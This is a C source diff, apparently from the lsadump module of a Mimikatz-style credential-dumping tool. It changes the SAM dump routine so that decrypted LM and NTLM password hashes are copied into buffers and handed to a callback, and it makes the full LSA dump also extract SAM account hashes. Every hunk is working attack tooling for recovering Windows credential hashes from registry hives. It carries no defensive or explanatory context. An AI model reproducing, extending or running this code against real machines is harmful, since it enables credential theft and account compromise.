@@ -45,7 +45,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 			{
 				if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, &hRegistry))
 				{
-					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, NULL, sysKey);
+					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, NULL, sysKey, NULL);
 					kull_m_registry_close(hRegistry);
 				}
 				CloseHandle(hData);
@@ -65,7 +65,7 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 			{
 				if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hBase))
 				{
-					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey);
+					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey, NULL);
 					kull_m_registry_RegCloseKey(hRegistry, hBase);
 				}
 				else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
@@ -148,7 +148,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 NTSTATUS kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx)
 {
 	PKULL_M_REGISTRY_HANDLE hSystem;
-	HKEY hSystemBase, hSecurityBase;
+	HKEY hSystemBase, hSecurityBase, hBase;
 	BYTE sysKey[SYSKEY_LENGTH];
 	BOOL isKeyOk = FALSE;
 
@@ -161,15 +161,23 @@ NTSTATUS kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx)
 				if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurityBase))
 				{
 					kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, TRUE, callbackCtx);
-					//kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, FALSE, callbackCtx);
 					kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
 				}
 				else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
+
+				if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hBase))
+				{
+					kuhl_m_lsadump_getUsersAndSamKey(hSystem, hBase, sysKey, callbackCtx);
+					kull_m_registry_RegCloseKey(hSystem, hBase);
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
 			}
+
 			kull_m_registry_RegCloseKey(hSystem, hSystemBase);
 		}
 		kull_m_registry_close(hSystem);
 	}
+
 	return STATUS_SUCCESS;
 }
 
@@ -284,10 +292,12 @@ BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, I
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPBYTE sysKey)
+BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPBYTE sysKey, IN PLSA_CALLBACK_CTX callbackCtx)
 {
 	BOOL status = FALSE;
 	BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
+	BYTE lmHash[LM_NTLM_HASH_LENGTH], ntlmHash[LM_NTLM_HASH_LENGTH];
+	BOOL hasLmHash = FALSE, hasNtlmHash = FALSE;
 	wchar_t * user;
 	HKEY hAccount, hUsers, hUser;
 	DWORD i, nbSubKeys, szMaxSubKeyLen, szUser, rid;
@@ -324,8 +334,14 @@ BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN H
 													if(status &= kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", 0, NULL, (LPBYTE) pUAv, &szUser))
 													{
 														kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
-														kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE);
-														kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE);
+														hasLmHash = kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE, lmHash);
+														hasNtlmHash = kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE, ntlmHash);
+
+														if (callbackCtx && callbackCtx->pSamHashHandler)
+														{
+															callbackCtx->pSamHashHandler(callbackCtx->lpContext, rid, (wchar_t *)(pUAv->datas + pUAv->Username.offset),
+																pUAv->Username.lenght / sizeof(wchar_t), hasLmHash, lmHash, hasNtlmHash, ntlmHash);
+														}
 													}
 													else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx V KO\n");
 													LocalFree(pUAv);
@@ -352,7 +368,7 @@ BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN H
 
 const BYTE kuhl_m_lsadump_NTPASSWORD[] = "NTPASSWORD";
 const BYTE kuhl_m_lsadump_LMPASSWORD[] = "LMPASSWORD";
-BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm)
+BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm, BYTE hashBuffer[LM_NTLM_HASH_LENGTH])
 {
 	BOOL status = FALSE;
 	MD5_CTX md5ctx;
@@ -369,10 +385,14 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 		MD5Final(&md5ctx);
 
 		RtlCopyMemory(cypheredHash, ((PSAM_HASH) (pStartOfData + pSamHash->offset))->hash, LM_NTLM_HASH_LENGTH);
-		if(NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer)))
+		if(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer)))
 		{
-			if(status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cypheredHash, &rid, clearHash)))
+			if (status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cypheredHash, &rid, clearHash)))
+			{
 				kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
+				if (hashBuffer)
+					memcpy(hashBuffer, clearHash, LM_NTLM_HASH_LENGTH);
+			}
 			else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
 		} else PRINT_ERROR(L"RtlEncryptDecryptARC4");
 	}
